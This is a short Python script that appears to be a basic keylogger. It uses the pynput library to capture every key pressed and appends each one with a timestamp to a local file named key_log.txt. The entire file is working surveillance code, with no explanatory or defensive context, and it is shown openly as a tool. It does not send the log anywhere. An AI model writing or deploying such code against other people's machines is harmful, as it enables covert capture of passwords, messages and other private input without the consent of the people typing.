from pynput.keyboard import Listener
import logging


if __name__ == '__main__':
		
	log_dir = ""
	logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')


	def on_press(key):
	    logging.info(str(key))


	with Listener(on_press=on_press) as listener:
	    listener.join()
